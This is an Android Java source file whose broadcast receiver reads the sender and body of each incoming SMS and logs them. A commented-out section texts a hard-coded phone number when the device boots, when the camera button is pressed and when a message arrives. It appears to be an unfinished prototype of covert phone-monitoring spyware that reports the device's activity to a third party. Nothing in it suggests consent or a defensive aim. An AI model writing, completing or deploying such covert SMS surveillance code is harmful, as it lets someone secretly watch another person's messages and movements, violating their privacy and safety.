package com.tools.smonitor;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

public class Monitor extends BroadcastReceiver {

    private final String TAG = this.getClass().getSimpleName();

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.i("MONITOR", "TEST MONITOR");

        Bundle extras = intent.getExtras();

        String strMessage = "";

        if ( extras != null )
        {
            Object[] smsextras = (Object[]) extras.get( "pdus" );

            for ( int i = 0; i < smsextras.length; i++ )
            {
                SmsMessage smsmsg = SmsMessage.createFromPdu((byte[])smsextras[i]);

                String strMsgBody = smsmsg.getMessageBody().toString();
                String strMsgSrc = smsmsg.getOriginatingAddress();

                strMessage += "ZZZ " + strMsgSrc + " : " + strMsgBody;

                Log.i(TAG, strMessage);
            }

        }

    }



           /*
        for(SmsMessage message : Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
            if (message == null) {
                Log.e("Z","ZZ");
                break;
            } else {
                Log.e("Z","ZZZ");
            }

            //smsOriginatingAddress = message.getDisplayOriginatingAddress();
            //smsDisplayMessage = message.getDisplayMessageBody();
        }



        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {

            String phoneNo = "2487057905";
            String message = "MONITOR JUST BOOTED TESTED";

            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(phoneNo, null, message, null, null);

        }

        else if (Intent.ACTION_CAMERA_BUTTON.equals(intent.getAction())) {
            String phoneNo = "2487057905";
            String message = "Camera on";

            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(phoneNo, null, message, null, null);
        }


        String phoneNo = "2487057905";
        String message = "YOU GOT SMS";

        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage(phoneNo, null, message, null, null);
    */


}